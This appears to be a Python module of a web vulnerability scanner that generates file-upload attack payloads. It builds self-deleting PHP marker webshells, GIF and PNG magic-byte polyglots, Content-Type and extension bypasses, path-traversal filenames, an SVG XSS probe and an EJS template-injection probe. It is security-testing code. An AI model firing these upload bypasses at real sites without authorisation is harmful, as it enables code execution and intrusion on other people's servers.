from __future__ import annotations

import base64
import json
import random
import uuid
from dataclasses import dataclass, field
from pathlib import Path

from modules.file_upload.markers import (
    RCE_NODE_MARKER,
    RCE_PHP_MARKER,
    VERIFY_RCE,
    VERIFY_STATIC,
    VERIFY_TEMPLATE,
    XSS_MARKER,
)

_CONFIG_PATH = Path("config") / "payloads" / "file_upload" / "file_upload_payloads.json"


@dataclass(slots=True, frozen=True)
class FilePayload:
    filename: str
    content: bytes
    content_type: str
    attack_type: str
    verify_mode: str = VERIFY_RCE
    marker: str = RCE_PHP_MARKER
    content_probe: str = ""
    shell_tags: tuple[str, ...] = field(default_factory=tuple)
    verify_paths: tuple[str, ...] = field(default_factory=tuple)


def _load_payload_config() -> dict:
    if not _CONFIG_PATH.exists():
        raise FileNotFoundError(f"File upload payload config not found: {_CONFIG_PATH}")
    try:
        with _CONFIG_PATH.open("r", encoding="utf-8") as f:
            loaded = json.load(f)
    except OSError as exc:
        raise OSError(f"Failed to read payload config: {_CONFIG_PATH}") from exc
    except json.JSONDecodeError as exc:
        raise ValueError(f"Invalid JSON payload config: {_CONFIG_PATH}") from exc
    if not isinstance(loaded, dict):
        raise ValueError(f"Payload config root must be object: {_CONFIG_PATH}")
    return loaded


def _marker_map(config: dict) -> dict[str, str]:
    raw = config.get("markers", {})
    if not isinstance(raw, dict):
        raw = {}
    return {
        "rce_php": str(raw.get("rce_php", RCE_PHP_MARKER)),
        "rce_node": str(raw.get("rce_node", RCE_NODE_MARKER)),
        "xss": str(raw.get("xss", XSS_MARKER)),
    }


def _resolve_content(raw: object, *, default: bytes) -> bytes:
    if raw is None:
        return default
    if isinstance(raw, str):
        encoding = "utf-8"
        if raw.startswith("base64:"):
            return base64.b64decode(raw[7:], validate=False)
        return raw.encode(encoding)
    raise ValueError("payload content must be a string")


def _build_filename(
    *,
    extension: str,
    prefix: str,
    base_names: list[str],
    literal_filename: str = "",
) -> str:
    if literal_filename.strip():
        return literal_filename.strip()
    ext = extension.strip()
    if not ext:
        raise ValueError("extension is required when filename is not set")
    if prefix and (".." in prefix or prefix.startswith(("/", "\\"))):
        base = prefix.rstrip("/\\")
        if ext.startswith("."):
            return f"{base}{ext}"
        return f"{base}.{ext}"
    chosen_prefix = prefix or random.choice(base_names)
    random_str = uuid.uuid4().hex[:6]
    return f"{chosen_prefix}_{random_str}.{ext}"


def _php_webshell(marker: str) -> bytes:
    return f"<?php echo '{marker}'; unlink(__FILE__); ?>".encode()


def _payload_from_classic(classic: dict, *, base_names: list[str], markers: dict[str, str]) -> FilePayload:
    ext = str(classic.get("extension", "")).strip()
    if not ext:
        raise ValueError("classic_payloads entry requires extension")

    verify_mode = str(classic.get("verify_mode", VERIFY_RCE)).strip().lower()
    attack_type = str(classic.get("attack_type", f"Classic_{ext}")).strip()
    content_type = str(classic.get("content_type", "application/octet-stream")).strip()
    prefix = str(classic.get("prefix", "")).strip()
    literal_filename = str(classic.get("filename", "")).strip()

    if verify_mode == VERIFY_STATIC:
        marker = str(classic.get("marker", markers["xss"])).strip()
        default_content = (
            f'<svg xmlns="http://www.w3.org/2000/svg">'
            f'<script>alert("{marker}")</script></svg>'
        ).encode()
        content_probe = str(classic.get("content_probe", "")).strip() or marker
    elif verify_mode == VERIFY_TEMPLATE:
        marker = str(classic.get("marker", markers["rce_node"])).strip()
        default_content = f"<%= '{marker}' %>".encode()
        content_probe = ""
    else:
        marker = str(classic.get("marker", markers["rce_php"])).strip()
        default_content = _php_webshell(marker)
        content_probe = ""

    content = _resolve_content(classic.get("content"), default=default_content)
    if verify_mode == VERIFY_STATIC and not content_probe:
        text = content.decode("utf-8", errors="replace")
        content_probe = marker if marker in text else text[:120]

    shell_tags = tuple(str(tag) for tag in classic.get("shell_tags", []) if str(tag))
    verify_paths = tuple(str(path) for path in classic.get("verify_paths", []) if str(path))

    return FilePayload(
        filename=_build_filename(
            extension=ext,
            prefix=prefix,
            base_names=base_names,
            literal_filename=literal_filename,
        ),
        content=content,
        content_type=content_type,
        attack_type=attack_type,
        verify_mode=verify_mode,
        marker=marker,
        content_probe=content_probe,
        shell_tags=shell_tags,
        verify_paths=verify_paths,
    )


def generate_payloads() -> list[FilePayload]:
    config = _load_payload_config()
    markers = _marker_map(config)
    php_marker = markers["rce_php"]

    base_webshell = _php_webshell(php_marker)
    gif_webshell = b"GIF89a;\n" + base_webshell
    png_webshell = b"\x89PNG\r\n\x1a\n\0\0\0\rIHDR" + base_webshell

    payloads: list[FilePayload] = []
    extensions = [str(ext) for ext in config.get("extensions", []) if str(ext)]
    content_types = [str(ct) for ct in config.get("content_types", []) if str(ct)]
    base_names = [str(name) for name in config.get("base_names", []) if str(name)] or ["upload"]

    def random_filename(ext: str, prefix: str = "") -> str:
        return _build_filename(extension=ext, prefix=prefix, base_names=base_names)

    for ext in extensions:
        for c_type in content_types:
            filename = random_filename(ext)
            subtype = c_type.split("/", 1)[-1]
            payloads.append(
                FilePayload(
                    filename=filename,
                    content=base_webshell,
                    content_type=c_type,
                    attack_type=f"Bypass_{ext}_CT_{subtype}",
                    verify_mode=VERIFY_RCE,
                    marker=php_marker,
                )
            )

    payloads.append(
        FilePayload(
            random_filename("php", "avatar"),
            gif_webshell,
            "image/gif",
            "Magic_Byte_GIF",
            verify_mode=VERIFY_RCE,
            marker=php_marker,
        )
    )
    payloads.append(
        FilePayload(
            random_filename("php", "receipt"),
            png_webshell,
            "image/png",
            "Magic_Byte_PNG",
            verify_mode=VERIFY_RCE,
            marker=php_marker,
        )
    )

    for ext in config.get("magic_byte_extensions", []):
        ext_text = str(ext).strip()
        if not ext_text:
            continue
        payloads.append(
            FilePayload(
                random_filename(ext_text, "image"),
                gif_webshell,
                "image/gif",
                f"Magic_Byte_GIF_{ext_text}",
                verify_mode=VERIFY_RCE,
                marker=php_marker,
            )
        )

    for classic in config.get("classic_payloads", []):
        if not isinstance(classic, dict):
            continue
        try:
            payloads.append(_payload_from_classic(classic, base_names=base_names, markers=markers))
        except ValueError:
            continue

    return payloads


def get_file_upload_payloads() -> list[FilePayload]:
    return generate_payloads()
